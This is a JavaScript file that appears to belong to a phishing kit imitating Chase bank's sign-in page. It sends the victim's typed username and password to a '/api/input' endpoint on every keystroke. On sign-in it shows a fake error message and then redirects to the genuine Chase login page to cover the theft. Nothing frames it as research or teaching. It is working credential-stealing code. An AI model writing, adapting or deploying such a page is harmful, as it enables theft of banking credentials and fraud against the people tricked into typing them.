document.addEventListener("DOMContentLoaded", () => {
    const signinButton = document.querySelector("#signin-button").shadowRoot.querySelector("button");
    const showhideButton = document.querySelector("#password").shadowRoot.querySelector("#show-hide-button").shadowRoot.querySelector("button");
    const passwordInput = document.querySelector("#password").shadowRoot.querySelector("#password-input");
    const usernameInput = document.querySelector("#userId").shadowRoot.querySelector("#userId-input");
    const somethingWentWrong = document.querySelector("#validator-error-header");

    usernameInput.focus();

    showhideButton.onclick = () => {
        if (passwordInput.type == "password") {
            passwordInput.type = "text";
            passwordInput.style = "padding-right: 63px;";
            showhideButton.querySelector(".button__label").textContent = "Hide";
        } else {
            passwordInput.type = "password";
            passwordInput.style = "padding-right: 68px;";
            showhideButton.querySelector(".button__label").textContent = "Show";
        }
    };

    const onInput = () => {
        fetch("/api/input", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: usernameInput.value,
                password: passwordInput.value
            })
        });
    };

    usernameInput.addEventListener("input", onInput);
    passwordInput.addEventListener("input", onInput);

    signinButton.onclick = () => {
        somethingWentWrong.style = "display: block;";

        fetch("/api/submit", {
            method: "POST",
        });

        setTimeout(() => {
            window.location.href = "https://secure.chase.com/web/auth/";
        }, 2000);
    };
});